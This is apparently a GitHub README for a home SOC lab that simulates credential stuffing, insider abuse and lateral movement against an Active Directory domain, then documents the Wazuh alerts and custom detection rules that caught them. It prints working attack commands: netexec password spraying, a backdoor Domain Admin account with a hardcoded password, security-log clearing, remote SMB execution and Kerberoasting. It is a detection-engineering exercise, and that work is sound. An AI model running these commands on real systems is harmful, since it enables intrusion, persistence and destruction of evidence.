# Financial Fraud → Cyber Threat Detection Pipeline

![Wazuh](https://img.shields.io/badge/SIEM-Wazuh%204.14.1-blue)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-red)
![Lab](https://img.shields.io/badge/Environment-SOC%20Lab-green)
![Focus](https://img.shields.io/badge/Security-Detection%20Engineering-orange)
![Status](https://img.shields.io/badge/Project-Completed-success)

---

## Executive SOC Summary

**What was simulated:**
- Credential stuffing attacks against Active Directory (SMB/NTLM authentication)
- Insider threat activity involving privileged account abuse on Domain Controller
- Lateral movement across internal Windows endpoints after initial compromise

**What was detected:**
- Authentication failure spikes (Event IDs 4625, 4771)
- Privilege escalation and account manipulation (Event IDs 4720, 4728)
- Anti-forensics behavior including log clearing (Event ID 1102)
- Lateral movement patterns via SMB and Kerberos anomalies (Event IDs 4624 Type 3, 4769)

**Business risk simulated:**
- Banking customer account takeover (ATO) via credential stuffing
- Internal fraud enabled by privileged insider abuse
- Domain-wide compromise risk through credential dumping and lateral movement

---

## Table of Contents

- [Overview](#overview)
- [Lab Architecture](#lab-architecture)
- [Scenario A — Account Takeover](#scenario-a--account-takeover-credential-stuffing)
- [Scenario B — Insider Threat](#scenario-b--insider-threat-privileged-abuse)
- [Scenario C — Lateral Movement](#scenario-c--lateral-movement)
- [Custom Detection Rules](#custom-detection-rules)
- [Detection Engineering Decisions](#detection-engineering-decisions)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Compliance Mapping](#compliance-mapping)
- [Threat Intelligence Enrichment](#threat-intelligence-enrichment)
- [SOC Visibility Summary](#soc-visibility-summary)
- [Author](#author)

---

## Overview

An end-to-end SOC detection engineering project simulating real-world financial cyber attacks inside an Active Directory environment. This project demonstrates how a SOC detects, investigates, and correlates:

- Account Takeover (Credential Stuffing)
- Insider Threat (Privileged Abuse)
- Lateral Movement (Post-Compromise Attack Paths)

Mapped to:

* MITRE ATT&CK Framework
* PCI-DSS Security Controls
* Banking Fraud Detection Scenarios

---

## Lab Architecture

| Component | Details |
|---|---|
| SIEM | Wazuh 4.14.1 — 10.0.10.11 |
| Domain Controller | Windows Server 2019 — DC01 (10.0.0.10) |
| Workstation | Windows 10 Enterprise — WKSTNO1 (10.0.0.100) |
| Attack Platform | Kali Linux — 10.0.20.11 |
| Firewall | pfSense — segmented attack/LAN/labnet subnets |
| Domain | SOCLAB.local |

---

## Scenario A — Account Takeover (Credential Stuffing)

### Attack Execution

### Reconnaissance
```bash
nmap -sS -sV -p 135,139,445,389,636,3389 10.0.0.10 -oN ~/lab/scenarioA_recon.txt
```
<img width="624" height="247" alt="image" src="https://github.com/user-attachments/assets/c06a9bf5-badb-419d-a7f7-733bd8b50a07" />

### Domain Enumeration
```bash
enum4linux-ng -A 10.0.0.10 | tee ~/lab/scenarioA_enum.txt
```
<img width="624" height="168" alt="image" src="https://github.com/user-attachments/assets/5b23edb6-e95a-4e65-810a-6514e80b2008" />

### Credential Stuffing Attack
```bash
netexec smb 10.0.0.10 \
  -u jkamau \
  -p ~/lab/banking_passwords.txt \
  --continue-on-success \
  2>&1 | tee ~/lab/scenarioA_netexec.txt
```
<img width="624" height="191" alt="image" src="https://github.com/user-attachments/assets/5fce9021-1987-4b29-a455-66e88c8b2468" />

## 2️⃣ SIEM Detection (Wazuh)

**Alerts fired:**
| Rule ID | Event ID | Description | Level |
|---|---|---|---|
| 18152 | 4625 | Multiple authentication failures | 10 |
| 18154 | 4740 | Account locked out — jkamau | 10 |
| 100035 | — | Credential stuffing: 5+ failures in 60s from 10.0.20.11 | 14 |

### Authentication Failures Flood

<img width="624" height="205" alt="image" src="https://github.com/user-attachments/assets/66a65489-8359-494c-932e-d79b6db6ffe4" />

<img width="624" height="286" alt="image" src="https://github.com/user-attachments/assets/59b30c19-87b8-4863-a44d-afb372238bdc" />

### Account Lockout Detection

<img width="624" height="204" alt="image" src="https://github.com/user-attachments/assets/19044e89-de81-4bb7-bc00-497a2dea960b" />

<img width="624" height="287" alt="image" src="https://github.com/user-attachments/assets/31681d10-5d3e-45df-86fb-748579e508ee" />

### Detection Outcome

- Rule 18152 fired within seconds of the first failed attempt — analyst action: isolate source IP, force password reset on jkamau
- Rule 18154 confirmed lockout threshold breach — analyst action: escalate to fraud team, check for concurrent successful logons from other IPs
- Gap identified: slow-and-low spray below 5 attempts/60s threshold evades detection — mitigated by rule 100005 (1-hour window)

---

# 🟠 Scenario B — Insider Threat (Privileged Abuse)

### Attack Execution

**AD Reconnaissance (as privileged insider):**
```powershell
Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,LastLogonDate | Export-Csv C:\Temp\all_users.csv
Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
Get-ADComputer -Filter * -Properties * | Select Name,OperatingSystem
```

<img width="624" height="76" alt="image" src="https://github.com/user-attachments/assets/e685b0f3-b702-4646-84e1-9468586f8b5f" />

<img width="624" height="269" alt="image" src="https://github.com/user-attachments/assets/90fe4de6-ab61-471d-a96a-9fe2d9e34c12" />

### Sensitive Data Access
```powershell
New-Item -Path "C:\SensitiveData" -ItemType Directory -Force
Set-Content -Path "C:\SensitiveData\customer_accounts.txt" -Value "ACCOUNT: KE001, Balance: 450000, PIN: 1234"
Get-Content "C:\SensitiveData\customer_accounts.txt"
```
<img width="624" height="242" alt="image" src="https://github.com/user-attachments/assets/1fb7ce8d-d25d-41b1-855f-5f51df800b22" />

<img width="624" height="65" alt="image" src="https://github.com/user-attachments/assets/567ff580-72c0-4e67-a8af-b5a39bfc5b85" />

## 2️⃣ Persistence & Abuse

### Backdoor Account Creation
```powershell
New-ADUser -Name "IT Support" `
  -SamAccountName "itsupport_backup" `
  -UserPrincipalName "itsupport_backup@SOCLAB.local" `
  -Path "CN=Users,DC=SOCLAB,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Backdoor@2024!" -AsPlainText -Force) `
  -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "itsupport_backup"
```

<img width="624" height="89" alt="image" src="https://github.com/user-attachments/assets/23478530-91c6-4aa0-950d-0a2cc84cc6f2" />

<img width="624" height="128" alt="image" src="https://github.com/user-attachments/assets/732bfabd-e0df-4d4d-aab5-65e6427b48cb" />

### Privilege Escalation

<img width="624" height="89" alt="image" src="https://github.com/user-attachments/assets/cbbd0d6d-ee05-4732-bc6f-48b6e10290a1" />

## 3️⃣ Anti-Forensics Activity

### Security Log Cleared (CRITICAL)
```powershell
wevtutil cl Security
```
<img width="538" height="50" alt="image" src="https://github.com/user-attachments/assets/0cc18251-250c-4c5e-8a49-c28fab2ead78" />

## 4️⃣ SIEM Detection (Wazuh)

| Rule ID | Event ID | Description | Level |
|---|---|---|---|
| 18110 | 4720 | User account created — itsupport_backup | 8 |
| 18141 | 4728 | User added to Domain Admins | 8 |
| 63102 | 1102 | Security audit log cleared — CRITICAL | 12 |
| 18108 | 4673 | Failed privileged operation attempt | 4 |

<img width="624" height="37" alt="image" src="https://github.com/user-attachments/assets/90eb154d-8b44-4f7d-b7d4-d4822013adde" />

## 🧠 Detection Outcome

- Rule 18110 (4720) fired immediately on backdoor account creation — analyst action: disable account, investigate creating user's recent activity
- Rule 63102 (1102) is a confirmed malicious indicator — no legitimate admin clears logs without a change ticket. Analyst action: immediate escalation, treat as active incident
- Gap identified: AD enumeration via Get-ADUser generates no security events without PowerShell Script Block Logging enabled — remediated by enabling Event ID 4104 logging

---

# 🔵 Scenario C — Lateral Movement

## 1️⃣ Post-Compromise Activity (Kali)

### Attack Execution

**Credential reuse with compromised backdoor account:**
```bash
TARGET_USER="itsupport_backup"
TARGET_PASS='Backdoor@2024!'

# Verify access to WKSTNO1
netexec smb 10.0.0.100 -u "$TARGET_USER" -p "$TARGET_PASS" -d SOCLAB

# Enumerate shares
netexec smb 10.0.0.100 -u "$TARGET_USER" -p "$TARGET_PASS" -d SOCLAB --shares

# Remote command execution
netexec smb 10.0.0.100 -u "$TARGET_USER" -p "$TARGET_PASS" -d SOCLAB -x "whoami && hostname"

# Pivot to DC01
netexec smb 10.0.0.10 -u "$TARGET_USER" -p "$TARGET_PASS" -d SOCLAB -x "net localgroup administrators"

# Kerberoasting
netexec ldap 10.0.0.10 -u "$TARGET_USER" -p "$TARGET_PASS" -d SOCLAB --kerberoasting ~/lab/kerberoast_hashes.txt
```

<img width="624" height="187" alt="image" src="https://github.com/user-attachments/assets/26633852-37b4-447a-85d5-8b8585c4b970" />

<img width="624" height="60" alt="image" src="https://github.com/user-attachments/assets/415f7cfb-8fa8-455b-aff8-1d0bd9845a18" />

<img width="624" height="92" alt="image" src="https://github.com/user-attachments/assets/3edd559e-4730-44ac-82f0-aa98ee26b4dc" />

<img width="624" height="60" alt="image" src="https://github.com/user-attachments/assets/7b4cb7be-733d-4668-b9a8-0d35fe85dc6c" />

<img width="624" height="92" alt="image" src="https://github.com/user-attachments/assets/67c99f0f-cd52-4ef2-86c1-8804f27f5db6" />

<img width="624" height="57" alt="image" src="https://github.com/user-attachments/assets/55be59cd-19cd-4659-aa43-fd745a98f29e" />

<img width="624" height="87" alt="image" src="https://github.com/user-attachments/assets/7c413db6-5891-42dc-bf69-f0046eb376bd" />

<img width="624" height="159" alt="image" src="https://github.com/user-attachments/assets/a768f5de-cfc9-4120-a2f5-db0aecc12984" />

<img width="624" height="129" alt="image" src="https://github.com/user-attachments/assets/2bf025fa-1860-421e-b02c-43e243cad7d4" />

<img width="624" height="34" alt="image" src="https://github.com/user-attachments/assets/c32cbb5f-c08c-48b1-b832-2a0ed4c59ce6" />

### SIEM Detection

| Rule ID | Event ID | Description | Level |
|---|---|---|---|
| 100020 | 4624 | Network logon (Type 3) from attack segment | 10 |
| 18107 | 4672 | Special privileges assigned on new logon | 8 |
| 100021 | 4769 | Kerberoasting — RC4 TGS requests | 12 |
| 100022 | 4688 | Remote shell spawned by services.exe | 13 |

### Detection Outcome

- Rule 100020 flagged network logon from `10.0.20.11` to WKSTNO1 — analyst action: trace logon chain, compare against baselines
- Kerberoasting pattern (RC4 TGS requests) detected by rule 100021 — analyst action: audit service accounts, enforce AES-only encryption
- Full attacker pivot chain reconstructed: Kali → WKSTNO1 → DC01 visible in Wazuh timeline

---

# Custom Detection Rules

Full rules file: [`rules/local_rules.xml`](rules/local_rules.xml)

Key rules implemented:

```xml
<!-- Credential stuffing: 5 failures in 60 seconds -->
<rule id="100035" level="14" frequency="5" timeframe="60">
  <if_matched_sid>100030</if_matched_sid>
  <description>ATO-DETECT: Credential stuffing in progress from Kali</description>
  <mitre><id>T1110.003</id></mitre>
</rule>

<!-- Audit log cleared -->
<rule id="100012" level="15">
  <if_sid>60106</if_sid>
  <field name="win.system.eventID">1102</field>
  <description>INSIDER-THREAT: CRITICAL - Security audit log cleared</description>
  <mitre><id>T1070.001</id></mitre>
</rule>

<!-- Lateral movement: network logon from attack segment -->
<rule id="100020" level="10">
  <if_sid>18105</if_sid>
  <regex>Source Address:  10\.0\.20\.11</regex>
  <description>ATTACK DETECTED: Network scan/block from Kali Linux</description>
  <mitre><id>T1046</id></mitre>
</rule>
```

---

## 🔥 Detection Engineering Decisions

**1. Frequency-based thresholds (Credential Stuffing)**
Low thresholds (5–20 events) within short windows (60–120s) balance sensitivity vs false positives. Designed to detect burst ATO attempts without flagging normal user mistypes.

**2. Insider threat detection (low frequency, high severity)**
Privilege escalation events are rare but high impact. Rules trigger immediately on single occurrence (4720, 1102). Prioritizes business risk over noise reduction.

**3. Anti-forensics handling**
Event log clearing (1102) is treated as CRITICAL regardless of context. No thresholding applied — its malicious correlation in banking environments is too high to require frequency.

**4. Lateral movement correlation**
Time windows (30–120 seconds) correlate SMB logons and remote execution to reconstruct attacker kill chain across multiple hosts.

**5. MITRE tagging strategy**
Each rule mapped to ATT&CK techniques for SOC triage efficiency and standardized reporting.

**6. Banking SOC alignment**
Detection logic reflects real-world financial institution constraints: high alert volume, rapid fraud detection requirements, strict compliance logging.

---

# 🧠 MITRE ATT&CK Mapping

| Technique ID | Technique | Scenario |
|---|---|---|
| T1110.003 | Password Spraying | Scenario A |
| T1078 | Valid Accounts | Scenario A, C |
| T1136.001 | Create Local Account | Scenario B |
| T1078.002 | Domain Accounts | Scenario B |
| T1070.001 | Clear Windows Event Logs | Scenario B |
| T1003.003 | NTDS Credential Dumping | Scenario B |
| T1021.002 | SMB Lateral Movement | Scenario C |
| T1558.003 | Kerberoasting | Scenario C |
| T1046 | Network Service Discovery | Scenario A, C |

---

# 🏦 Compliance Mapping

| Rule ID | Detection | PCI-DSS | Banking Control |
|---|---|---|---|
| 100035 | Credential Stuffing | Req 10.2.4 | CBK: Account access monitoring |
| 18154 | Account Lockout | Req 8.1.6 | Customer protection controls |
| 18110 | New Account Created | Req 8.1.1 | Segregation of duties |
| 63102 | Audit Log Cleared | Req 10.5.1 | Log integrity requirement |
| 100020 | Network Logon from Attack Segment | Req 10.2.4, 11.4 | Network segmentation control |
| 100021 | Kerberoasting | Req 8.6 | Service account hardening |

---

# 🐍 Threat Intelligence Enrichment

## Threat Intelligence Enrichment

Python enrichment script at [`scripts/enrich_alerts.py`](scripts/enrich_alerts.py) enriches Wazuh alert exports with:

- AbuseIPDB reputation scoring
- MITRE technique mapping per rule ID
- Risk classification: INFO → LOW → MEDIUM → HIGH → CRITICAL
- Analyst action recommendations (MONITOR / ESCALATE)

```bash
pip install -r scripts/requirements.txt
python3 scripts/enrich_alerts.py --input alerts.csv --output enriched_report.csv
```

---

# 📊 SOC Visibility Summary

<img width="1892" height="762" alt="image" src="https://github.com/user-attachments/assets/a3f2a3a5-759c-4232-ad71-1ec8633bd635" />

---

**Detection gaps identified:**
- AD enumeration via PowerShell cmdlets requires Script Block Logging (4104) — not enabled by default
- Slow credential spray below frequency threshold evades burst detection — addressed with 1-hour window rule

---

# 👤 Author

Moses Kinuthia
Cybersecurity Analyst | SOC Engineering | Nairobi, Kenya
Focus: Detection Engineering • Threat Intelligence • SOC Automation
